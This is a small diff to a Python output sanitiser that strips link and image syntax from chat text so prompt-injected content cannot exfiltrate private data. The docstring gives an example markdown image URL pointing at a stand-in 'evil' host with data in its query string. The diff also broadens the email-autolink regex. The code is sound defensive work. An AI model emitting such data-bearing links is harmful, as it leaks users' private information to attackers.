@@ -4,7 +4,7 @@ Used where the prompt mixes private data with untrusted web text: a prompt-injec
 (`![x](//evil/?d=...)`, or the reference form `![x][r]` + `[r]: ...`) would make the browser send that
 data out. Rather than blocklisting markdown syntax, the characters links and images need are removed:
 square brackets go, `://` / `www.` are broken, a space follows any `<` before a letter (no
-`<http:...>` / `<mailto:...>` autolinks) and any `@` inside a word (no email autolinks). Raw HTML needs no handling
+`<http:...>` / `<mailto:...>` autolinks) and any `@` between non-space characters (no email autolinks). Raw HTML needs no handling
 because the chat renderer doesn't render it. Every rule is a fixed-width text rewrite, so streaming
 only holds back the last few characters in case a pattern spans two chunks.
 """
@@ -13,7 +13,7 @@ import re
 
 _WWW = re.compile(r"www\.", re.IGNORECASE)
 _ANGLE_AUTOLINK = re.compile(r"<(?=[A-Za-z])")
-_EMAIL_AT = re.compile(r"(?<=\w)@(?=\w)")
+_EMAIL_AT = re.compile(r"(?<=\S)@(?=\S)")
 # Longest pattern ("www.") minus one: enough tail to finish a pattern split across chunks.
 HOLD = 3
 
